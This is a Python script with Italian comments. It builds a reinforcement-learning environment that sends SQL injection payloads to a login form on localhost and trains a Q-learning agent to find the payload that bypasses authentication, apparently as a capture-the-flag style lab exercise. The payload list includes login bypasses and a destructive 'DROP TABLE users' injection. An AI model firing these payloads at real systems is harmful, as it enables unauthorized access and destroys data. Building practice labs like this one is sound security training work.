import gymnasium as gym
import numpy as np
import requests

class SQLInjectionEnv(gym.Env):
    """
    Ambiente per simulare un attacco di SQL injection in un'applicazione web vulnerabile.
    """

    def __init__(self):
        super(SQLInjectionEnv, self).__init__()
        self.action_space = gym.spaces.Discrete(10)  # 10 possibili azioni (diverse iniezioni)
        self.observation_space = gym.spaces.Discrete(3)  # 3 stati (login fallito, vulnerabilità trovata, successo)
        self.state = 0  # stato iniziale (login fallito)
        self.flag_found = False
        self.max_steps = 10  # numero massimo di passi per episodio
        self.steps_taken = 0

    def reset(self):
        """Resetta l'ambiente al suo stato iniziale."""
        self.state = 0
        self.flag_found = False
        self.steps_taken = 0
        return self.state, {}

    def step(self, action):
        """Esegui un'azione e aggiorna lo stato e la ricompensa."""
        self.steps_taken += 1
        if self.steps_taken >= self.max_steps:
            done = True
            reward = -1  # Penalizzazione per timeout
        else:
            done = False
            reward = -1  # Penalizzazione per azioni errate
            username = "admin"
            password = "password123"  # Password di default

            # Diversi payload di SQL Injection per testare
            payloads = [
                "' OR '1'='1",  # Combinazione comune di SQL injection
                "' OR 1=1 --",  # Altra forma di iniezione
                "' OR 'a'='a",  # Altra variante
                "'; DROP TABLE users; --",  # Test per tentare di distruggere il DB
                "' OR 1=1#",  # Variante di iniezione
                "' OR 'a'='a' --",  # Variante di iniezione
                "' AND 1=1",  # Tentativo di bypassare il login
                "' OR 'x'='x'",  # Tentativo di bypassare
                "' AND 1=1 --",  # Tentativo di bypassare
                "' OR 1=1#"  # Tentativo di bypassare
            ]

            # Testa l'iniezione SQL
            payload = payloads[action]  # Scegli la payload basata sull'azione

            # Invia la richiesta POST all'app vulnerabile
            url = "http://localhost:5000/login"
            data = {'username': username, 'password': payload}

            response = requests.post(url, data=data)

            # Se la risposta indica successo dell'iniezione, segnala il successo
            if "SQL Injection successful!" in response.text:
                self.state = 1  # Stato: vulnerabilità trovata
                reward = 10  # Ricompensa per successo
            elif "Login successful!" in response.text:
                self.state = 2  # Stato: flag trovato
                reward = 100  # Ricompensa maggiore per aver trovato il flag
                self.flag_found = True
                done = True

        return self.state, reward, done, {}

    def render(self):
        """Stampa lo stato attuale dell'ambiente."""
        print(f"Stato: {self.state}, Flag trovato: {self.flag_found}")


# Parametri di Q-learning
learning_rate = 0.1
discount_factor = 0.99
epsilon = 1.0
epsilon_decay = 0.995
min_epsilon = 0.1
episodes = 5000

# Inizializzazione della Q-table
q_table = np.zeros((3, 10))  # 3 stati x 10 azioni

# Funzione di esplorazione ε-greedy
def select_action(state, epsilon, q_table):
    if np.random.rand() < epsilon:
        return np.random.choice(10)  # Esplorazione: azione casuale
    else:
        return np.argmax(q_table[state])  # Sfruttamento: azione migliore

# Ambiente
env = SQLInjectionEnv()

# Algoritmo di Q-learning
for episode in range(episodes):
    state, _ = env.reset()
    done = False

    while not done:
        action = select_action(state, epsilon, q_table)  # Scegli l'azione
        next_state, reward, done, _ = env.step(action)  # Esegui l'azione

        # Aggiorna la Q-table
        q_table[state, action] = q_table[state, action] + learning_rate * (
            reward + discount_factor * np.max(q_table[next_state]) - q_table[state, action]
        )

        state = next_state

    # Decadimento di epsilon
    epsilon = max(min_epsilon, epsilon * epsilon_decay)

    # Monitoraggio
    if episode % 1000 == 0:
        print(f"Episodio {episode}, epsilon: {epsilon:.2f}")

print("Addestramento completato!")

# Test dell'agente
state, _ = env.reset()
done = False
print("Inizio del test...")
while not done:
    action = np.argmax(q_table[state])  # Scegli l'azione ottimale
    state, reward, done, _ = env.step(action)
    env.render()
